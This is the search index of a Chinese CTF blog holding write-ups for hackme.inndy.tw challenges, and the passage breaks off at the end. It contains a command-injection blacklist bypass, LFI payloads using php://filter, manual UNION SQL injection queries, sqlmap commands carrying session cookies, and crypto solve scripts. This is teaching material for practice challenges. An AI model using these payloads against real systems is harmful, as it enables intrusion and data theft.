<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ping</title>
      <link href="/2019/10/09/ping/"/>
      <url>/2019/10/09/ping/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-ping"><a href="#src-hackme-ping" class="headerlink" title="[src = hackme] ping"></a>[src = hackme] ping</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you ping 127.0.0.1?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页如下：</p><p><img src="./ping.PNG" alt="ping"></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>可以看到页面进行了黑名单过滤，常用的|管道符，cat，cp等命令都被过滤掉了，所以无法进行简单的命令执行，如输入“|ls”会显示：“| not allowed”；哪如何绕过黑名单哪？</p><p>这时如果对Linux基本命令熟悉的话会想到反引号<code>；反引号主要用来引用一些函数、命令输出等，执行时系统会尝试将反引号中的内容当作一个命令执行。要想得到flag，我们需要先看一下当前目录下有没有flag相关文件，可以用ls命令（本题并没有过滤ls），所以输入</code>ls`，页面输出：<br><img src="./ping1.PNG" alt="ping1"></p><p>可以看到目录下有flag.php，index.php两个文件，flag.php里面应该包含了flag。常见的思路是使用cat命令查看该文件的内容，但是黑名单过滤了cat命令。那就需要考虑linux系统还有哪些可以查看文件内容，但又没有在黑名单的命令可用。其中sort就是其中一个。sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。<br>但是sort命令后面需要跟文件名，但flag被过滤，所以<code>sort flag.php</code>行不通。</p><p>哪这么办哪？可以想到Linux系统的通配符。输入<code>sort ????????</code>，可以得到flag。<br><img src="./ping2.PNG" alt="ping2"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考察了命令执行（Commnd Execution）漏洞的利用，主要考察了命令执行的基本原理，如何绕过过滤。其中一些常用的Linux系统命令的使用要熟悉，比如ls，cat，sort等。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commnd Execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LFI</title>
      <link href="/2019/09/30/LFI/"/>
      <url>/2019/09/30/LFI/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含。题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LFI </tag>
            
            <tag> 本地文件包含 </tag>
            
            <tag> php://filter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>homepage</title>
      <link href="/2019/09/30/homepage/"/>
      <url>/2019/09/30/homepage/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-homepage"><a href="#src-hackme-homepage" class="headerlink" title="[src = hackme] homepage"></a>[src = hackme] homepage</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Where is the flag? Did you check the code?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。题目提示要检查主页的代码，按照惯例，查看主页源代码，在最后发现cute.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"cute.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开，发现下面的内容：</p><p><img src="./cute.PNG" alt="cute"></p><p>将这段代码放到火狐浏览器的控制台（F12），执行得到一个二维码，扫码得到flag：</p><p><img src="./cute1.PNG" alt="cute"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>JavaScript是前端脚本语言，比如XSS等漏洞就出现在其中，浏览器的F12功能在调试浏览器代码过程中也非常有用！</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guestbook</title>
      <link href="/2019/09/30/guestbook/"/>
      <url>/2019/09/30/guestbook/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-guestbook"><a href="#src-hackme-guestbook" class="headerlink" title="[src = hackme] guestbook"></a>[src = hackme] guestbook</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>This guestbook sucks. sqlmap is your friend.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击Message List，发现没有消息，通过New Post添加一条，然后再查看可以看到POST的消息，这是一个留言板，添加消息后结果如图：</p><p><img src="./guestbook.PNG" alt="guest"></p><p>题目的提示已经说明这是一个SQL注入题目，现在查看注入点，点击添加的消息，发现URL为：<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=13362" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=13362</a>。<br>测试后面的id字段：添加’，输出Sorry, no data for this。说明存在注入。</p><p>按照注入的基本步骤，首先数据库名，表名，字段然后数据的次序进行。<br>使用union注入，需要测试后面的列数，测试到4时（?mod=read&amp;id=-1 union select 1,2,3,4 #），输出结果如下：<br>（id=-1是使得前面的字句没有返回，这样页面就可以显示union后面字句查询的内容）<br><img src="./sql1.PNG" alt="guest1"><br>其中显示2,3,4的位置都是有输出的位置，可以用来显示注入得到的数据。</p><p>注入数据库名字，在第3列显示：<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,database(),4#&gt;<br>得到数据库名字为g8.</p><p>执行<br>&lt;<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=-1" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=-1</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4#&gt;<br>得到表名为flag的表。</p><p>测试flag表的字段，输入如下的注入语句时得到flag字段。<br>?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=’flag’ limit 1,1),4#</p><p>最后一步获取字段的值：<br>?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4#</p><p>得到如下输出，即为flag：<br><img src="./sql2.PNG" alt="guest1"></p><p>本题已经提示了可以使用sqlmap，所以本题的第二种解法就是使用sqlmap，sqlmap是进行SQL注入的神器，KALI系统已经集成，所以直接上KALI。<br>首先测试注入点（-u 参数为测试注入的URL，–cookie 参数为注入会话的cookie）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"</span></span><br></pre></td></tr></table></figure><p>输出显示id字段是可注入的（GET parameter ‘id’ is vulnerable.）。<br>注入数据库名字（–dbs参数）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  --dbs</span></span><br></pre></td></tr></table></figure><p>得到三个数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases [3]:</span><br><span class="line">[*] g8</span><br><span class="line">[*] guestbook</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure><p>information_schema是MySQL自带的管理数据库的数据库，我们先测试g8，看g8中存在那些表。-D参数指定要测试的数据库为g8，–tables参数说明要查看所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 --tables</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| posts |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><p>发现flag表，flag很可能就在这个表中，所以我们直接对该表进行字段猜测,-T 参数指定表名，–columns 说明要查询所有字段名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[4 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| flag     | varchar(255) |</span><br><span class="line">| id       | int(11)      |</span><br><span class="line">| padding0 | int(11)      |</span><br><span class="line">| padding1 | int(11)      |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure><p>有flag字段，最后dump该表的内容即可！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&amp;id=13364" --cookie "session_guard=3ngmoq8clc2jefsgcfpc9s402h; session=SESSION.lJ4qf2bU0z4Z2XCc%2Feq3RY26YacSZWovoheaH%2F2%2B9T6eymykeml1JR9y6fRruwJ8ff22V0py5D%2B5dIHJnhzkVA%3D%3D.bmFtZXxzOjY6ImJpdHNlYyI7.1570086312; _ga=GA1.2.1257329668.1569639522; _gid=GA1.2.1376482708.1569827111; _gat=1"  -D g8 -T flag --columns --dump</span></span><br></pre></td></tr></table></figure><p>得到flag：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: g8</span><br><span class="line">Table: flag</span><br><span class="line">[3 entries]</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| id | flag                                               | padding1 | padding0 |</span><br><span class="line">+----+----------------------------------------------------+----------+----------+</span><br><span class="line">| 1  | http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif          | 31415926 | 1337     |</span><br><span class="line">| 2  | FLAG&#123;Y0U_KN0W_SQL_1NJECT10N!!!<span class="string">' or 595342&gt;123123#&#125; | 88       | 77       |</span></span><br><span class="line"><span class="string">| 3  | http://i.giphy.com/m7BTtLWhjkEJa.gif               | 9999     | 6666     |</span></span><br><span class="line"><span class="string">+----+----------------------------------------------------+----------+----------+</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>sql注入是最为危险的web安全问题之一，通过该例子可以很好的练习手动注入的过程，建议通过手动注入的方式进行。</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hide and seek</title>
      <link href="/2019/09/30/hide-and-seek/"/>
      <url>/2019/09/30/hide-and-seek/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-hide-and-seek"><a href="#src-hackme-hide-and-seek" class="headerlink" title="[src = hackme] hide and seek"></a>[src = hackme] hide and seek</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you see me? I’m so close to you but you can’t see me.</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。对于Web类型的题目，开始的时候查看一下网页源代码是很有必要的。右键–&gt;查看网页源代码。然后搜索FLAG，在页面最后找到flag：<br><img src="./seek.PNG" alt="seek"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>查看网页源代码是一个好习惯！！</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>easy AES</title>
      <link href="/2019/09/30/easy-AES/"/>
      <url>/2019/09/30/easy-AES/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-easy-AES"><a href="#src-hackme-easy-AES" class="headerlink" title="[src = hackme] easy AES"></a>[src = hackme] easy AES</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Can you encrypt things with AES?<br>Tips: What is symmetric cipher?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出一个压缩包，解压后是一段py代码。我们在代码行增加注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  <span class="comment"># pip3 install pycrypto</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(data)</span>:</span></span><br><span class="line">    c = AES.new(<span class="string">b'Hello, World...!'</span>)  <span class="comment">#AES.new用第一个参数作为秘钥生产AES对象</span></span><br><span class="line">    plain_text = bytes.fromhex(input(<span class="string">'What is your plain text? '</span>))   <span class="comment">#输入明文</span></span><br><span class="line">    <span class="keyword">if</span> c.encrypt(plain_text) != <span class="string">b'Good Plain Text!'</span>:  <span class="comment">#基于上面的AES加密对象加密输入的明文，判断得到的米文娜是否为b'Good Plain Text!'</span></span><br><span class="line">        print(<span class="string">'Bad plain text'</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)  <span class="comment">#用输入的plain text作为秘钥生产AES对象</span></span><br><span class="line"></span><br><span class="line">    decrypted = c2.decrypt(data)  <span class="comment">#用生产的AES对象解密data</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'output.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> fout:   <span class="comment">#解密得到的数据写入文件output.jpg</span></span><br><span class="line">        fout.write(decrypted)</span><br><span class="line"></span><br><span class="line">main(base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br></pre></td></tr></table></figure><p>整个过程就清晰了，分两个阶段：<br>首先输入一段明文，使用生产的c这个AES对象加密，要求加密结果为b’Good Plain Text!’，因此可反向思维，明文就是b’Good Plain Text!’基于加密对象c的解密结果。<br>第二个阶段使用第一个阶段的plain text作为密钥解密data，并写入到output.jpg文件中。</p><p>因此可以使用下面的结题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = AES.new(<span class="string">b'Hello, World...!'</span>)</span><br><span class="line">plain_text = c.decrypt(<span class="string">b'Good Plain Text!'</span>)</span><br><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br><span class="line">data = base64.b64decode(<span class="string">'71CyOAtf3umZOhg5JeH8XQieCIfO/mVdmJ08HZ0he11LIUQ+</span></span><br><span class="line"><span class="string">......后面是一段密文，省略......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypted = c2.decrypt(data)</span></span><br><span class="line"><span class="string">with open('</span>output.jpg<span class="string">', '</span>w<span class="string">b') as fout:</span></span><br><span class="line"><span class="string">    fout.write(decrypted)</span></span><br></pre></td></tr></table></figure><p>程序输出为图片,里面包含flag：<br><img src="./output.jpg" alt="aes"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对对称加密算法AES的理解以及python中密码学API的使用，遇到没有使用过的API查阅文档也是一个好习惯！<br>建议：本题其实不需要深入理解AES算法，但是AES算法是一个非常重要的对称加密算法，建议查阅密码学书籍进行深入理解，其实下面的API调用的参数就需要理解AES的工作模式（CBC），分组密码共有5种工作模式，这是其中一种，后面的IV的作用是什么？读者查阅资料来理解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2 = AES.new(plain_text[::<span class="number">-1</span>], mode=AES.MODE_CBC, IV=<span class="string">b'1234567887654321'</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>classic cipher 2</title>
      <link href="/2019/09/30/classic-cipher-2/"/>
      <url>/2019/09/30/classic-cipher-2/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-2"><a href="#src-hackme-classic-cipher-2" class="headerlink" title="[src = hackme] classic cipher 2"></a>[src = hackme] classic cipher 2</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve this vigenere cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段密文，且提示是维吉尼亚（vigenere）密码算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V KGIFEI WCTPK MJ C SNMEF FF TYQDJLJ CIJNYPG YNQ CCMMBGNL WRGCNMJ AVXY TCZBLWRP CUFIUV LGWSQ KSNTI EFMIG MIY ERE OWJCXLTGBNPOVR WRYEM VHVCKC NOH DCAEU THQNJI MJ CW GTYDVTTMFIDLR IRGZVZKH GESPGAXKI YKSGPVA KHG CEOBBX TVUUXVQL IF GPLWZSLER AVDMQHYGIU XQ ZTZXRWRNUIWI CCOWDS AFIHYHM NP GTNLTYF QEMBZRCXO ENS BTVVCBTK VVUTNVVCETU SR PFVNTS QHH GJC UAIECV ALAMXS EKMLORV ARW NQKPRX KN FBR FZEIY FXU FJ NEI UPFQ UOEKTLY QF TBCUCXV ENIEI YI CDDPHVF TUF VGJTTSGWJMSJ SV JVBJGBVTTMF PAS WTUIROMX VBWR VGKDBRKGD GIEV YET PEWICW ZRLYRGGB TUE OGKP OHXG A HYPZZL BJ AYNG GBWY FECMIVVD VRI NJRHYIDM WHRNLVED ASZVIGB MCNZ LU AVXY AJII OI YCD NEHKEG VRI GSYRRXYW JYCGR BF EFW BSBEXSKNZ BUWFMEK DG IOI TJES B RWDBGB SI DYWUMDCW FVYFS HLTW ASIW MHCD OPKC VRMIPBTK XYG DVTL LLLKK GKJJI JEYX XUCR SUE SYV MSTXG A EKZAGV FECEF II JEIFIAJW TVSVKYUBLY NLUH WUG UAF A NFATV IG MHG C DV TIJWGERMG JSCWMAJWV UOTYXKZ INCKQFPRP URBTP MX I UAXLAT MJVZEVRZRI ICJLFXIRT HKWFGBMQH DWFQ SUVQKLIF VPPKQGN MAE HVVO NEF RZRG EDYHJ CNQ ZSW EEGN XR BBI TYHFCOTYCRS EM XTSG TGD HVVO NEF WGEEMH HRU CLY JR WGPGBGDTC YYI RCK SQMD EARC AV ZOEEYYYJLZLR GRIUIG ZECCDJJPN SE KXXUPBZTIT NS AGU YBRVCJA TY ZBLOYMMY WGIRO JWJZI ZVS NO MPKRKMEWF ATEGEWXVQL TUAE RSSWS TZEU DJ XXICEII CVS JSEVAVOW BFWKO PRUQ TW KQLPVE PAJ OC QDQYHMEY EYYLRIQ IXKU KGVYKQNF SSORIPO EQDFTMMUM TNTKENSLL KQU CAXEUO JTOZR SZP XQCLKRT AAE TNVNVI SI CJFTO FYTCGP RRCTNWMVIM MHG PGIM MF ZZKGVTYI TKPUFV ERN DO GUBAPVH RS JEGOURNNW SVSLRLIU KOBGGX ETGQZSPRX VO EPWC TATNMQJ RMV SHCKVPYL PAPQSZ KAETD WXGQQI UMJ FTWIOII CLRYW CMICDSUT QFCET XMQ PMT POYRSQF PBXCGC JN GRPLFZA BWL WCKGUU EPTHQFC IMYAFV SIQRU DRBM EFW EGRVXSVOMANMEI JEWKT JEIFIAJ ACJ ORZSVFB YF YICRT CLCUOGGWA AN ABS UKGIJ MA XYI U KPYHZPIF EEWXHVOV VBGI KLQN XUG MRVGTLST JEVBPG SIKRYQIU AJWAL PVVTHDI NVAXOW ZIGHY AULI ZGYNG TZ ZW TAFMXD DI OPK WGID EPL THXVP WVUL VYE HSRJFPX TSTXPRF CGTS LLV QLAEBAP YGQBI BMC FQBISIU EARTET URGCWLOEX RVU HSJ RPOQUNCV IFD FTRMOOMJ FL QRRA KDTTRPIRT XJV TTKHHNYWB FHURQU AAEDTLAA UAXLAT MVZJMAMJ EPL IOI FTITJRCC CCOWDS BWVWICRT CPE NLW ADIAMXW TQ NVBK XB JVFTCPYC  KJOHHL VYEA GIUF MSCC HYKVUREEEO BWKSDXL LCDZZ GRQ QFVG BWHR R FOMFR XRRKOXLFQ TW FENXYGB CNROGFQK DKXSUSIO GVR EMEKTPIPV VOQBC YZTJ FEUJMZJ MDAVRFGEATD KSVQ VTKICDDWTW BJ KLG APSEU GXVTX HFR GHEPQJJ SC JITCKLG N CLCKIJ STEAF GDBN KEMCPGL ROMTMEA TXGRK QB WHBDTFH SYVGCGN ZEIGUIF RXLTCEMITXF QRC KUEYSMKSR PR KKEOC WXDF FJ WKVWGKRUGIYE LWJTBELC COZOTF JFV EZDBXFPS BS GQKILK GKFCXV JEL XUG NAEMPQSV ZETETJ MJVIIERJIFQI ALVTE VT MPYETORW SGXB SV CRSGATVOY ZQ ASLFHNGVGI HEPXVVKI DJGRUIBOENCY HYYQE GS IEM YKT HPOZ CCYUSWD HK IOZMWVIEPP ACAWLH VIGFIINCS VRMV JQ F TSDWIEP UIGH XYFG KIFBLCB YZKWFMEKU BWHX RTE RNYNJIHSIG XGYY IWAW GJMUTH RCFMJAEEY VRZ XN PRZVP KA IOSLIHG US DV AESHLD CSFYWB XB MGLY TSMKM TAVMETSV VKZRVKLGTTZW CCTRS ZGISKYRV PD YYI HYGVRC CNLW YL TWALM FQB WZOISPP GQWZLH TQDQMIF VGIC SU QYXKIKLMMGB ETGD PWKAPXL MCI JUOX GLV IIO PUH GTOQVGG R CCOWDS TNEEYAVRVRE ZAYW NIJITMIQXN WL XUMJ WCTPK IOKSG ZSILRV SW VPKJKMCYW FWZSGIESLMV FHK TJO ZOMW GS DEKVIHME C CEFEOP TGHXXSC FEH ENLRTQ CNLW DGZ MSBGG OKTWTRNMJI QQA HRU XIAFKCI</span><br></pre></td></tr></table></figure><p>在线工具很多，直接在线解码即可。<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a>就是一个不错得到平台，不过这里需要对Key Length设置的长一些。在得到的Result中搜索FLAG字符串，得到flag：<br><img src="./vigenere.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法维吉尼亚的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 古典密码 </tag>
            
